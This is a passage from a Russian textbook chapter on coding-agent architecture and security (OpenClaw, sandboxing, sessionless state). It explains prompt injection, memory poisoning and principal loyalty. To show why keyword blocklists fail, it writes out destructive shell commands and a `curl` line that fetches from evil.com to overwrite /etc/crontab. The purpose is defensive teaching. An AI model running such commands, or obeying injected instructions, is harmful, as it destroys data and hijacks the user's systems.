# Coding Agent и генерация кода

В предыдущих главах подробно рассматривались контекстная инженерия (главы 2 и 3) и проектирование инструментов (глава 4). В этой главе мы объединим эти компоненты, чтобы ответить на ключевой вопрос: **как устроена архитектура универсального AI-агента, способного решать произвольные задачи?**

Ответ: **универсальный агент, ориентированный на задачи открытого типа**, в основе которого лежат **Coding Agent** (агент, способный самостоятельно писать, изменять и выполнять код) и **файловая система** — рабочее пространство, где агент хранит код, данные, память и промежуточные результаты, подобно тому как программист управляет проектами с помощью папок на компьютере. Этот вывод подтверждён практикой индустрии: от Manus до OpenClaw успешные универсальные агенты для задач открытого типа следуют одной парадигме — создают среду выполнения Coding Agent на основе небольшого набора универсальных инструментов (выполнение кода, чтение и запись файлов, поиск), а поверх неё добавляют модули браузерной автоматизации, интернет-поиска и других возможностей. Границы применимости этого вывода будут отдельно рассмотрены в конце раздела «От Manus до OpenClaw».

Почему генерация кода способна взять на себя такую роль? Потому что это не просто один из инструментов в наборе, а **метавозможность** — способность динамически создавать во время выполнения новые инструменты и возможности. Во второй половине главы, в разделе «Код: метавозможность универсального агента», эта концепция и шесть направлений её применения будут раскрыты полностью.

Ценность кода для агента проявляется на двух уровнях. На уровне **рассуждения** формализованный код делает мышление предельно строгим: выражение «возраст старше 18 лет и личность подтверждена» на естественном языке может допускать несколько толкований, тогда как запись `age > 18 and is_verified` совершенно однозначна. На уровне **выражения** успешно выполняющийся код сам по себе служит доказательством логической непротиворечивости, а результат выполнения предоставляет объективный критерий правильности — естественный язык этого обеспечить не может.

Сначала в этой главе будут рассмотрены базовые возможности Coding Agent и архитектура универсального агента (OpenClaw), а затем показано применение генерации кода в различных сценариях — от математических рассуждений и создания контента до метавозможностей системного уровня.

## Coding-агент

### Написание кода — базовая способность агента

**Генерация кода — не привилегия немногочисленных специализированных агентов, а базовая способность, которой должен обладать каждый универсальный AI-агент**. Благодаря современным SOTA-моделям для реализации базовых возможностей написания кода не требуется сложная архитектура.

Рассмотрим типичную задачу: «Собрать все оставшиеся в репозитории комментарии TODO, классифицировать их по приоритету и создать issue». Для этого необходимо просмотреть структуру каталогов (ls/glob), прочитать код (read), изменить файлы (edit/write), выполнить команды (bash) и найти шаблоны (grep/search). Эти пять типов операций охватывают практически все основные действия Coding-агента и лежат в основе семи инструментов, которые будут рассмотрены ниже. Строго говоря, пяти типам операций естественным образом соответствуют шесть инструментов; седьмой, Code Interpreter, предназначен для «выполнения кода и вычислений», а в некоторых реализациях просто объединён с Bash. Семь инструментов — это стандартизированный эталонный набор, который не обязан строго соответствовать пяти типам операций один к одному.

Базовому Coding-агенту достаточно следующих семи основных инструментов:

1. **Code Interpreter (интерпретатор кода)**: предоставляет изолированную песочницу (sandbox, то есть безопасную среду выполнения, отделённую от основной системы, где даже ошибочный код не повредит хосту) для безопасного выполнения кода Python
2. **Bash Shell (терминал командной строки)**: выполняет команды в терминале, например запускает тесты или обрабатывает файлы специальных форматов
3. **Инструмент чтения файлов**: читает код, конфигурации, документацию, журналы и другие файлы
4. **Инструмент записи файлов**: создаёт новые файлы или полностью перезаписывает существующие
5. **Инструмент редактирования файлов**: вносит локальные изменения в существующие файлы; это основная операция при сопровождении и итеративной разработке кода
6. **Инструмент поиска по именам файлов (Glob)**: быстро находит нужные файлы в файловой системе по шаблону, например `**/*.py` позволяет найти все файлы Python в проекте
7. **Инструмент поиска по содержимому файлов (Grep)**: ищет в содержимом файлов заданный текстовый шаблон, например все строки кода, вызывающие определённую функцию

Эти семь инструментов образуют полный, но предельно минималистичный набор, который можно с небольшими затратами интегрировать практически в любую агентную систему. Каждый из них можно представить в виде стандартизированного сервиса инструментов через протокол MCP, описанный в четвёртой главе. Обратите внимание: это базовая конфигурация, характерная именно для Coding-агента. Она отличается от приведённой в четвёртой главе классификации универсальных инструментов по направлению вызова и характеру действия — восприятие, выполнение, совместная работа, событийный запуск и взаимодействие с пользователем. Семь основных инструментов главным образом покрывают восприятие и выполнение. Читатель может спросить: а что насчёт совместной работы, событийного запуска и взаимодействия с пользователем? В Coding-агентах эти потребности обычно реализует агентный фреймворк, а не слой инструментов. Например, делегированием задач субагентам управляет оркестрационная логика фреймворка, а не специализированный инструмент совместной работы.

Рассмотрим на простейшей задаче, как взаимодействуют эти семь инструментов. Предположим, пользователь говорит: «Собери все комментарии TODO в проекте в единый список».

```
Агент (рассуждение): нужно найти все строки кода, содержащие TODO.
Агент → Grep("TODO", glob="**/*.py")          # Поиск по содержимому файлов
Инструмент возвращает:
  src/api.py:42: # TODO: добавить ограничение частоты запросов
  src/db.py:15:  # TODO: перейти на PostgreSQL
  tests/test_api.py:8: # TODO: добавить тесты граничных случаев

Агент (рассуждение): найдено 3 TODO, нужно составить список и записать его в файл.
Агент → Write("TODO_LIST.md", content="...")   # Запись файла
Инструмент возвращает: файл создан

Агент: готово. Найдено 3 пункта TODO, список сохранён в TODO_LIST.md.
```

Весь процесс задействовал только два инструмента: Grep для поиска по содержимому и Write для записи файла. Если задача сложнее — например, «подсчитать количество TODO в каждом модуле и построить столбчатую диаграмму», — агент также воспользуется Code Interpreter, чтобы выполнить код Python для подсчёта и построения графика. Хотя семь инструментов просты, их сочетание позволяет решать самые разнообразные задачи.

Почему каждый универсальный агент должен уметь писать код? Потому что генерация кода — это не только создание программ, но и универсальный способ решения задач. Для математических рассуждений можно написать фрагмент кода и передать вычисления решателю, чтобы получить точный ответ. Бизнес-правила код фиксирует намного точнее, чем естественный язык. Если не хватает инструмента, его можно временно написать. Если изменился формат данных, можно динамически сгенерировать логику разбора. Далее в этой главе эти сценарии будут рассмотрены по отдельности. Агент с базовой способностью писать код может динамически расширять границы своих возможностей при появлении новых требований, даже если его набор ограничен семью простыми инструментами выше.

### Пример: от Manus до OpenClaw — программное ядро универсального агента

Универсальные агентные продукты, представителем которых служит Manus, объединяют в одной системе три ключевые возможности: Deep Research (глубокое исследование), Computer Use (управление компьютером) и Coding (генерацию кода). Это подчёркивает вывод, неоднократно подтверждённый самыми разными практиками: **Coding-агент вместе с файловой системой образует главную техническую основу универсального агента для открытых задач**. Схожий подход применяется и в проекте OpenClaw, который демонстрирует эту архитектурную парадигму на примере открытой реализации.

Почему ядром служит Coding-агент, а не две другие возможности? Потому что практически любая эффективная генерация контента в конечном счёте опирается на код. PPT по сути представляет собой код в формате OOXML (Office Open XML — открытый стандарт офисных документов, разработанный Microsoft). Документы Word и отчёты PDF можно генерировать программно, анализ и визуализация данных выполняются скриптами Python, а успешную последовательность действий с браузером в GUI можно зафиксировать в виде повторно используемого RPA-кода (Robotic Process Automation, роботизированная автоматизация процессов; сам Computer Use рассматривается в девятой главе, а механизм фиксации последовательностей действий — в восьмой). Поиск и обобщение информации в Deep Research можно реализовать через программно управляемые веб-запросы и разбор ответов. Хотя Computer Use более универсален, по стоимости, задержке и стабильности он значительно уступает прямому выполнению тех же операций через код или API. Генерация кода — наиболее эффективная, дешёвая и пригодная для повторного использования основа возможностей.

Рассмотрим эту архитектуру на конкретном процессе выполнения. Предположим, пользователь просит: «Помоги проанализировать данные о продажах за прошлый квартал и подготовить краткий отчёт».

1. **Чтение памяти**: агент читает `MEMORY.md` и узнаёт, что пользователь предпочитает отчёты в формате PDF, а источником данных служит Google Sheets
2. **Вызов инструментов**: через модуль веб-поиска получает сведения об использовании Google Sheets API, а затем программно загружает данные
3. **Написание кода**: создаёт на Python скрипт анализа данных — агрегация с помощью pandas и визуализация через matplotlib
4. **Создание результата**: записывает результаты анализа в `report.pdf`, а диаграммы — в каталог `charts/`
5. **Обновление памяти**: добавляет в `MEMORY.md` запись «Данные пользователя о продажах находятся в Google Sheets, ID: xxx», чтобы в следующий раз не спрашивать об этом снова

На протяжении всего процесса файловая система служит узлом информационных потоков: память читается из файлов, результаты записываются в файлы, а опыт также сохраняется в файлах.

**Файловая система как центр агента**. В архитектуре OpenClaw файловая система — намного больше, чем хранилище данных: это центр памяти, знаний и возможностей агента. Долговременная память агента хранится в `MEMORY.md`, содержащем высокоуровневые факты и предпочтения пользователя, а также в архивируемых по датам журналах Markdown. Решение использовать Markdown вместо векторной базы данных может показаться нелогичным, но на практике оно чрезвычайно эффективно. Пользователь может напрямую открыть файл, прочитать и изменить память агента: если агент что-то запомнил неверно, достаточно удалить соответствующую строку. Markdown естественным образом сохраняет временной порядок и предотвращает временную путаницу, характерную для семантического поиска, а Git позволяет вести контроль версий и выполнять откат.

Ещё важнее то, что агент умеет записывать файлы, а значит, может **саморазвиваться** через запись в них. Если при первом выполнении задачи агент обнаружит ранее неизвестные важные сведения — например, что при звонке в определённый банк для подтверждения личности необходимо назвать адрес отделения, в котором был открыт счёт, — он запишет этот опыт в базу знаний и автоматически загрузит его при следующем выполнении той же задачи. Этот механизм, позволяющий агенту «умнеть по мере использования», по сути представляет собой практическую реализацию парадигмы экстернализованного обучения, которая подробно рассматривается в восьмой главе.

**Границы применимости: для каких агентов Coding служит архитектурным ядром**. Утверждение «Coding-агент — ядро универсального агента» относится прежде всего к универсальным агентам, **ориентированным на открытые задачи**: глубокое исследование, генерацию контента и обработку данных, где границы задачи неопределённы, а формы результата разнообразны. В таких сценариях невозможно заранее перечислить все необходимые инструменты, поэтому генерация кода как метавозможность предоставляет наиболее экономичный способ динамически расширять границы возможностей и становится ядром архитектуры. У другого класса агентов — специализированных агентов поддержки и голосовых помощников — пространство задач относительно замкнуто, а основная архитектура строится вокруг фиксированных бизнес-процессов, предметных инструментов и диалоговых стратегий. Код здесь скорее остаётся одним из инструментов, чем архитектурным центром. Именно такую роль — инструмент проверки политик — он играет в рассматриваемом далее примере τ-bench, бенчмарка, имитирующего работу службы поддержки. Но даже для этого класса способность писать код остаётся незаменимой: точные вычисления, обработка данных и проверка правил без неё невозможны. Это напрямую перекликается с утверждением предыдущего раздела о том, что написание кода — базовая способность агента: выбор Coding в качестве архитектурного ядра зависит от сценария, но умение писать код является общей минимальной планкой для всех агентов.

### Архитектура Sessionless

Далее рассматриваются два решения: взаимодействие по принципу «доступен в любой момент» и архитектура безопасности. На первый взгляд они не связаны с темой Coding-агентов, однако именно от них зависит, как агент управляет средой выполнения кода и состоянием файловой системы, а это ключевые вопросы для Coding-агента. Читатели, которые сначала хотят понять пошаговый процесс работы Coding-агента, могут перейти к разделу «Общий процесс работы Coding-агента», а затем вернуться к архитектуре взаимодействия и безопасности.

OpenClaw использует архитектуру **Sessionless** — без сессий. Она не требует установки, входа в систему или «открытия приложения»: агент постоянно находится в сети, и пользователь может в любой момент отправить ему сообщение через уже используемую платформу обмена сообщениями. Эта форма взаимодействия, а также лежащие в её основе маршрутизация сообщений Gateway и событийно-ориентированная архитектура подробно рассматривались в разделе четвёртой главы об инструментах взаимодействия с пользователем, поэтому здесь мы не будем повторяться. Важно подчеркнуть предпосылку, благодаря которой такая модель стала возможной: большие модели уже достаточно зрелы, чтобы служить новой «интеллектуальной основой». Подобно тому как традиционная операционная система скрывает аппаратное обеспечение и предоставляет приложениям единообразную абстракцию, большая модель скрывает сложности понимания языка, рассуждений и планирования, предоставляя агенту единообразную интеллектуальную абстракцию. Именно благодаря этой основе стало возможно с небольшими инженерными затратами реализовать модель «постоянно работает и отвечает в любой момент».

Для Coding-агента настоящая инженерная сложность Sessionless заключается в том, **как сохранять среду выполнения кода и состояние файловой системы между сообщениями**. Два сообщения пользователя могут разделять минуты или дни, а работа агента зависит от большого количества неявного состояния: установленных в песочнице зависимостей, рабочего каталога и переменных среды терминальной сессии, работающего в фоне сервера разработки, недописанных файлов. OpenClaw разделяет управление состоянием на два уровня. **Состояние файловой системы сохраняется естественным образом**: каталог рабочего пространства (workspace) подключается к постоянному хранилищу вне песочницы, поэтому код, данные и промежуточные результаты не теряются ни между сообщениями, ни при перезапуске песочницы. Это ещё одно значение выражения «файловая система как центр агента». **Состояние процессов при необходимости сохраняется или восстанавливается**: пока песочница и находящиеся в ней терминальные сессии активны, они продолжают работать, чтобы не выполнять для каждого сообщения холодный запуск, повторный переход в каталог и повторную активацию виртуального окружения. После истечения времени бездействия они уничтожаются для освобождения ресурсов, но перед этим сериализуемое состояние среды — рабочий каталог, переменные среды и перечень фоновых задач — записывается в файлы рабочего пространства. При следующем пробуждении агент восстанавливает среду по этим записям. Рассматриваемая далее в разделе «Сохранение состояния среды выполнения команд» постоянная терминальная сессия представляет собой аналогичный механизм в рамках одной задачи; Sessionless расширяет ту же проблему до масштаба нескольких сообщений и нескольких дней.

Sessionless также не означает отсутствия обслуживания: каждое сообщение пользователя требует **повторно загрузить полную траекторию и рабочее состояние**, поэтому к эффективности сериализации состояния и стратегии сжатия траектории предъявляются повышенные требования. Принципы проектирования сжатия траектории уже рассматривались в разделе второй главы «Стратегии сжатия контекста», а здесь основное внимание уделено инженерным компромиссам архитектуры Sessionless.

### Безопасность Coding-агента

В этом разделе защитные механизмы Coding-агента объединяются в единую последовательную картину. Сначала описывается **модель угроз** — какие риски наиболее опасны. Затем рассматривается **изоляция как последний рубеж защиты**: сетевой выход песочницы, файловая система и ограничения ресурсов. После этого разбирается **защита во время выполнения**: семантический анализ команд и спекулятивное выполнение, делающее проверки безопасности «невидимыми». Наконец, обсуждаются **доверие и лояльность**: кому должен быть лоялен агент при делегировании несколькими сторонами и как переместить границу доверия на уровень данных, если сгенерированный AI код сам по себе не заслуживает доверия. Модель угроз, лояльность и границы доверия применимы ко всем агентам, а песочница и анализ команд — это специфические дополнения для Coding-агента.

Парадигма «суверенного агента» создаёт серьёзные проблемы безопасности. Coding-агент может читать и записывать файлы, выполнять команды и обращаться к сети, поэтому внедрение вредоносных инструкций способно привести к необратимым последствиям. Разработчик и независимый исследователь Simon Willison сформулировал этот риск в виде знаменитой «смертельной триады»: если присутствуют все три элемента, образуется замкнутая цепочка атаки и система становится крайне опасной.

1. **Доступ к приватным данным** — агент может читать файлы пользователя и данные менеджера паролей
2. **Воздействие недоверенного содержимого** — обрабатываемые электронные письма и веб-страницы могут содержать вредоносную нагрузку
3. **Возможность внешнего взаимодействия** — агент может отправлять письма и выполнять команды

Так замыкается путь атаки: вредоносная инструкция попадает в агента из недоверенного содержимого, вынуждает его прочитать приватные данные, а затем передать их через внешний канал. Обратите внимание: одного наличия всех трёх элементов уже достаточно для серьёзного риска, дополнительные условия не требуются. К этому автор добавляет четвёртое измерение — **долговременную память**. Это не четвёртое обязательное условие, равноправное с остальными, а усилитель атаки: злоумышленник может записать в долговременную память агента кажущиеся безобидными предубеждения или вредоносные инструкции, оставить их там между сессиями и активировать в подходящий момент, превратив разовую атаку в долговременное скрытое воздействие.

Эти четыре аспекта можно свести к четырём видам границ: границе данных, границе доверия к вводу, границе влияния вывода и межсессионной границе. Полностью привилегированные локальные агенты, подобные OpenClaw, обладают всеми четырьмя характеристиками, поэтому защита становится для них одной из основных задач.

Этим же объясняется, почему закрытые коммерческие агенты, например Claude Cowork — универсальный агент Anthropic для интеллектуального труда, использующий агентную архитектуру Claude Code и способный читать и записывать локальные файлы и выполнять многошаговые задачи в нескольких офисных приложениях, — придерживаются консервативной политики разрешений. Причина не в технической невозможности, а в слишком высоком риске. Одной фильтрацией ввода практически невозможно защититься от инъекций в промпт. Главное — не распознать каждую атаку, а лишить агента возможности реально выполнить опасное действие даже после успешной инъекции. В предыдущих двух главах уже была выстроена многоуровневая система защиты: **защита на уровне контекста** — маркировка источников внешнего содержимого, структурированное разделение ролей и очистка ввода — рассматривается в разделе второй главы об инъекциях в промпт; **защита на уровне выполнения** — независимая проверка Sidecar, Human in the loop (человек в контуре), минимальные привилегии и разделение разрешений — рассматривается в четвёртой главе. Агенту, находящемуся в том же контексте, сложно определить, был ли он скомпрометирован инъекцией, поэтому критические операции должен проверять механизм за пределами этого контекста. Этот принцип проходит через обе главы. Здесь добавляются лишь три особенности Coding-агента:

- **Семантический анализ команд** — из-за комбинаторного взрыва вариантов Shell-команд чёрные списки ключевых слов бесполезны; необходимо понимать реальный эффект команды на семантическом уровне, что подробно рассматривается далее;
- **Изоляция песочницы и управление сетевым выходом** — выполнение кода создаёт специфическую для Coding-агента поверхность атаки; инженерный выбор уровня изоляции и политики исходящих подключений рассматривается ниже;
- **Межсессионная защита долговременной памяти** — это расширение смертельной триады, особо выделенное в этой главе: содержимое, записываемое в долговременную память, должно проходить такую же проверку доверия, как внешнее содержимое, чтобы вредоносные инструкции не могли надолго закрепиться в `MEMORY.md`.

Эти три дополнения относятся соответственно к уровням проверки, выполнения и данных и дополняют систему защиты из предыдущих двух глав. Они не устраняют риск полностью, но уменьшают поверхность атаки агента.

**Изоляция как последний рубеж: инженерный выбор песочницы для выполнения кода.** Песочница — не один переключатель, а совокупность инженерных решений. Четвёртая глава уже отвечала на вопрос, зачем нужна изоляция, описывала градацию её механизмов — изоляцию на уровне процессов, контейнеры и microVM — и предлагала правила выбора: процессы для личного локального использования, контейнеры для одноарендной облачной среды, microVM или gVisor для многоарендной среды либо незнакомого кода. Здесь эта градация не повторяется; рассматриваются только четыре дополнительных вопроса, неизбежных при практической реализации Coding-агента и не раскрытых в четвёртой главе: управление сетевым выходом, объём подключаемой файловой системы, ограничения ресурсов и согласование постоянных сессий с изоляцией.

**Управление сетевым выходом**. Это наиболее недооценённая, но самая важная мера: сеть по умолчанию отключена, а доступ к ограниченному набору адресов — источникам пакетов, сайтам документации и явно необходимым для задачи API — предоставляется по мере необходимости через прокси с белым списком. Вернёмся к третьему пункту смертельной триады — «возможности внешнего взаимодействия». Управление сетевым выходом защищает именно исполнительную сторону этой угрозы: даже если инъекция в промпт удалась и вредоносный код прочитал конфиденциальные данные внутри песочницы, без канала наружу он не сможет их передать. В отличие от попыток распознавать каждую инъекцию, перекрытие канала утечки данных обеспечивает намного более детерминированную защиту.

**Область изоляции файловой системы**. Каталог исходного кода подключается только для чтения. Агент изменяет код через инструмент редактирования, а созданный патч записывается на диск после проверки, либо копия исходного кода подключается к доступному для записи рабочему пространству. Для результатов и промежуточных файлов выделяется отдельный каталог рабочего пространства с правом записи. Файлы с учётными данными — `~/.ssh`, ключи и токены — вообще не подключаются к песочнице: невидимые данные невозможно похитить. Это соответствует первому пункту смертельной триады.

**Ограничения ресурсов и тайм-ауты**. Ограничения CPU, памяти и дискового пространства в сочетании с тайм-аутом по реальному времени защищают от бесконечных циклов, fork-бомб — лавинообразного самокопирования процессов до исчерпания ресурсов системы — и неограниченной записи на диск. Важная практическая деталь: при превышении времени или лимита агенту следует возвращать структурированную ошибку, например «выполнение остановлено после превышения 120 секунд; последний вывод приведён ниже», а не молча завершать процесс. Тогда агент сможет скорректировать стратегию на следующем шаге.

**Согласование постоянных сессий с изоляцией**. В рассматриваемом далее разделе «Сохранение состояния среды выполнения команд» предлагается поддерживать долговечную терминальную сессию, тогда как принцип изоляции требует уничтожать среду после использования. Между этими требованиями существует напряжение. Решение состоит в том, что **сессия продолжает работать только внутри песочницы**: жизненный цикл терминальной сессии строго ограничен жизненным циклом песочницы, а её состояние никогда не переносится на хост. Если требуется восстановление после длительного перерыва, как в описанной выше архитектуре Sessionless, используются снимок песочницы либо сочетание «постоянные файлы рабочего пространства + восстановление среды скриптом», а не бесконечное продление жизни песочницы. Иными словами, сохраняется **аудируемое описание состояния** — файлы, скрипты и перечни, — а не непрозрачные работающие процессы.

**Безопасность: семантический анализ вместо чёрного списка ключевых слов**. В первой главе отмечалось, что уровень проверки должен применять защиту «на основе понимания, а не сопоставления». Проверка безопасности Shell-команд — наиболее сложное применение этого принципа. Простой чёрный список ключевых слов не способен справиться с комбинаторным взрывом Shell: любую статическую норму можно обойти с помощью конвейеров, subshell и подстановки переменных. Например, если запрещён `rm`, злоумышленник может обойти запрет через `$(echo rm) -rf /`. Harness промышленного уровня использует семантический анализ: понимает типы аргументов каждой команды и правила их потребления — в частности, какие флаги забирают следующий аргумент, — и распознаёт атаки, в которых кажущийся безобидным флаг фактически поглощает следующий аргумент и скрывает опасную нагрузку. Например, `find / -name '*.log' -exec rm {} \;` встраивает операцию удаления `rm` в допустимые аргументы команды `find`, а `curl -o /etc/crontab http://evil.com/payload` выглядит как загрузка файла, но фактически перезаписывает системное расписание задач. Семантический анализ способен распознать такие вложенные опасные операции, а простой чёрный список команд — нет. Подобная защита, основанная на понимании вместо сопоставления, представляет собой продвинутую реализацию функции ограничений.

**Спекулятивное выполнение: «невидимые» проверки безопасности**. Это пользовательский эффект механизма шлюза Sidecar из четвёртой главы. Там объяснялось, почему критические операции должен проверять Sidecar, независимый от основного контекста; здесь важно, как сделать эту проверку незаметной для пользователя. Для этого «отображение» и «разрешение» выполняются параллельно: когда агент готовится вызвать инструмент, система сначала показывает в интерфейсе индикатор прогресса, например «Чтение файла `src/main.py`...», одновременно запуская фоновую проверку безопасности. Здесь необходимо прояснить часто используемую аналогию: это не то же самое, что спекулятивное выполнение в CPU. Если прогноз CPU оказался неверным, рассчитанные результаты приходится отбрасывать, а состояние — откатывать. Здесь заранее отображается лишь **не имеющее побочных эффектов уведомление интерфейса**. Оно не изменяет реальное состояние, поэтому при неудачной проверке откат не требуется: уведомление просто заменяется на «Ожидание подтверждения». В большинстве случаев проверка безопасности завершается раньше, чем пользователь успевает её заметить, и дополнительная задержка совершенно не ощущается. Реальная пауза для подтверждения возникает только тогда, когда быстро принять решение невозможно. Это высшая ступень проектирования Harness: безопасность достигается без ущерба для пользовательского опыта.

**Кому лоялен агент: лояльность при делегировании несколькими сторонами.**

Предыдущие механизмы защищают от «неправильного выполнения команды», но существует и более тонкая проблема безопасности — **лояльность принципалу** (principal loyalty): **чью сторону в действительности принимает агент**. При обучении модель получает простое правило по умолчанию: «Я стараюсь помочь тому, кто со мной разговаривает». Но реальный агент часто оказывается в ситуации **многостороннего делегирования**: он действует от имени владельца, однако взаимодействует с третьей стороной, интересы которой противоположны. Например, если агент торгуется за вас, собеседник — не «пользователь, которому нужно помочь», а **оппонент на переговорах**. В такой ситуации принцип «помогать тому, кто говорит» становится опасной настройкой по умолчанию: оппонент может переманить агента на свою сторону, просто вступив с ним в разговор.

Эксперименты с передовыми моделями в подобных ситуациях демонстрируют отчётливый **спектр лояльности**, причём неудачи возникают на обоих концах[^ch5-1]. С одной стороны, агент может быть **слишком откровенным**: сразу сообщить оппоненту конфиденциальные сведения владельца, например «наша нижняя граница — 12000», а после нескольких раундов давления сдаться и пойти на уступки. С другой стороны, агент может быть **слишком подозрительным** и отказывать даже в законных запросах владельца, из-за чего задачу вообще невозможно выполнить. Эти два вида неудач образуют качели: устранение утечек часто приводит к чрезмерным отказам, и сбалансировать их очень трудно.

Для Coding-агента эта проблема особенно актуальна. Недоверенное содержимое репозитория, вывод инструмента или инструкции от стороннего MCP-сервера — всё это «оппоненты», пытающиеся заставить агента перейти на другую сторону. **Инъекция в промпт по сути и есть попытка переманить агента** — см. вторую и четвёртую главы. Поэтому слой Harness должен явно закрепить объект лояльности: инструкции владельца имеют высший приоритет, а любое содержимое от внешних участников по умолчанию понижается до данных, которые «можно учитывать, но которые не обладают силой инструкций». На уровне системного промпта эффективный **кодекс лояльности** выглядит так: защищать приватные сведения владельца и даже сам факт их существования; при отказе не перечислять по пунктам причины запрета, поскольку это само по себе может раскрыть информацию; не путать внутренние ограничения с публичной позицией; выполнять только явные и конкретные инструкции владельца; не поддаваться повторяющемуся давлению. По существу, Harness добавляет модели отсутствующую у неё по умолчанию позицию: **абсолютная лояльность владельцу и осторожность по отношению к внешним сторонам**.

[^ch5-1]: Полную оценку спектра лояльности и соответствующего кодекса см. в работе Li, Bojie and Noah Shi. *Whose Side Is Your Agent On? Multi-Party Principal Loyalty in LLM Agents.* arXiv:2606.30383, 2026.

**Если написанный AI код сам не заслуживает доверия: перенос границы доверия ниже.**

Кодекс лояльности из предыдущего раздела повышает **вероятность** соблюдения правил агентом, но для высокорисковых операций с данными «повышенной вероятности» недостаточно. Ограничения необходимо перенести с уровня «надежды на сознательность агента» на уровень принудительного контроля данных. Более радикальная позиция состоит в следующем[^ch5-2]: **следует изначально считать прикладной уровень недоверенным, а принудительное соблюдение инвариантов данных перенести ниже него**. Последние тридцать лет граница целостности программного обеспечения находилась на **прикладном уровне**: код handler определял, кто вправе выполнять операции и какие значения допустимы, а база данных безоговорочно доверяла этому коду. Однако сгенерированный LLM код handler часто упускает проверки разрешений и целостности, а автономные агенты напрямую изменяют производственные данные, поэтому прежняя предпосылка больше не выполняется. Новый подход, который можно назвать объектами данных со встроенными разрешениями (Permission-Embedded Data Objects), наделяет каждую сущность данных декларативными правилами доступа, валидаторами и описаниями последствий в рамках **проверенной человеком schema**. Runtime-конвейер принудительно применяет эти правила при **каждой операции записи**. Ключевой примитив — прикреплённый к каждой операции **контекст доступа (access context)**: повторно сгенерированный handler работает с разрешениями пользователя, которого обслуживает, а автономный агент — от собственного имени с ограниченными полномочиями (scoped principal). Вместо того чтобы полагаться только на лояльность агента, архитектура превращает его в субъекта с ограниченными правами, который не сможет переступить границы даже после компрометации.

При сравнении на одном и том же наборе промптов этот механизм не допустил **ни одной операции записи, нарушающей объявленные инварианты**. В то же время голый SQL, проверки, написанные самой LLM, конституционные промпты и перехватчики на границе действий пропускали от нескольких до десятков нарушений. Такой подход не «чаще оказывается правильным», а «не может ошибиться», при этом каждая операция записи замедляется лишь примерно на 2 миллисекунды. Разумеется, гарантия действует при определённых условиях: schema должна полностью описывать требуемые инварианты, а развёртывание — перекрывать все пути, позволяющие недоверенному уровню обойти хранилище и подключиться к базе данных напрямую. Для Coding-агента отсюда следует важный архитектурный принцип: **если доверять нельзя ни тому, кто пишет код, ни тому, кто его выполняет, надёжные ограничения должны находиться не в сгенерированном коде, а на расположенном ниже фундаментальном уровне, проверенном человеком**. Это предельное воплощение на уровне данных сформулированного в первой главе принципа «ограничения важнее указаний».

[^ch5-2]: Архитектуру и оценку подхода, «переносящего границу доверия ниже прикладного уровня», включая полное сравнение количества нарушений, см. в работе Li, Bojie. *The Application Layer Is No Longer Trusted: Enforcing Data Invariants Below AI-Written Code and AI Agents.* 2026 (готовится к публикации).

### Общий процесс работы Coding-агента


![Рисунок 5-2. Процесс работы Coding-агента](images/fig5-2.svg)


Ниже описан **рекомендуемый инженерный процесс**, переносящий лучшие практики программной инженерии на агента и представляющий идеальную модель. Реальные Coding-агенты, такие как Claude Code и OpenClaw, чаще работают в реактивном итеративном цикле и **адаптируют процесс по необходимости**: в простых задачах они пропускают проектный документ и не блокируются на каждом шаге в ожидании одобрения пользователя. Полностью все стадии проходят только сложные задачи с широкой областью влияния.

**Документирование проекта.**

Работа Coding-агента начинается с системного понимания проекта. При первом знакомстве с репозиторием кода агент должен не сразу приступать к изменениям, а сначала сформировать представление обо всём проекте. Подобно новому инженеру, он не отправляет код в первый же рабочий день, а сначала изучает структуру проекта. Прежде всего агент проверяет наличие документации: README, архитектурных документов и руководств для разработчиков.

Если ключевой документации нет, агент не должен начинать работу вслепую. Ему следует взять на себя документирование проекта: системно изучить кодовую базу, определить основные модули, ключевые абстракции и зависимости между компонентами, а затем подготовить исходную документацию с обзором архитектуры, структурой каталогов и инструкциями по запуску тестов. Этот документ станет как планом дальнейшей работы агента, так и точкой входа для других разработчиков. Здесь проявляется ключевой принцип: явное представление знаний — обязательное условие эффективной совместной работы.

Сегодня документирование проектов приобрело специальную форму для агентов — **файлы проектных инструкций**. CLAUDE.md, AGENTS.md, .cursorrules и подобные файлы стали фактическими отраслевыми стандартами. Они автоматически добавляются в контекст при запуске каждой сессии и фактически служат системным промптом уровня проекта. В отличие от README, предназначенного для людей, файлы инструкций содержат правила поведения агента: команды сборки и тестирования — «используй `pnpm test`, а не `npm test`»; стиль кода — «тип any запрещён»; явные запреты — «не изменяй каталог `migrations/`». Это применение на другом уровне той же идеи, что лежит в основе `SOUL.md` OpenClaw, определяющего личность и правила поведения агента, и `MEMORY.md`, сохраняющего опыт между сессиями. SOUL.md задаёт, «кем является агент», а файл проектных инструкций — «как работать в этом проекте». С точки зрения контекстной инженерии из второй главы файл инструкций также представляет собой наиболее экономичный стабильный префикс: его содержимое не зависит от задачи и естественным образом эффективно использует KV-кэш. Кроме того, это прямое воплощение принципа «знания должны находиться в самой кодовой базе».

Из принципа явного представления знаний следует ещё один интересный вывод: **команды, хорошо приспособленные к удалённой работе, обычно также хорошо приспособлены к AI-агентам**. Удалённые команды вынуждены опираться на асинхронное взаимодействие и документацию: решения фиксируются в документах, контекст описывается в issue и PR, а знания команды сохраняются в руководствах для разработчиков, а не передаются устно между соседними рабочими местами или на доске в переговорной. Именно такие знания способен использовать агент: он не слышит устных договорённостей, но может прочитать проектный документ. И наоборот, в команде, сильно зависящей от возможности «спросить коллегу за соседним столом», порог входа одинаково высок и для нового удалённого сотрудника, и для агента. Простым косвенным показателем готовности команды к AI может служить вопрос: способен ли новый удалённый сотрудник начать самостоятельную работу, располагая только репозиторием кода и документацией?

**Понимание задачи и уточнение требований.**

Если простое требование имеет чёткие границы и ограниченную область влияния — например, нужно исправить известный bug или изменить параметр функции, — агент может сразу перейти к реализации. Однако большинство задач разработки программного обеспечения не настолько просты.

При работе со сложными требованиями агент должен действовать осторожнее и системнее. Сложность может возникать в нескольких измерениях: неоднозначность самого требования, когда пользователь понимает желаемый результат, но не может точно его сформулировать; разнообразие путей реализации, когда доступно несколько технических решений с разными компромиссами; широкая область влияния, когда изменения затрагивают несколько модулей и могут нарушить существующую функциональность. Агенту следует уточнить границы с помощью предварительного исследования и при необходимости самостоятельно начать диалог с пользователем. Например, получив просьбу «оптимизировать производительность системы», агент должен сначала выяснить конкретную цель: снизить время отклика, уменьшить потребление памяти или повысить пропускную способность; определить допустимые компромиссы, например можно ли увеличить сложность кода; и найти текущее узкое место. Начало программирования при неоднозначных требованиях часто приводит к большому объёму переделок.

**Подготовка проектного документа.**

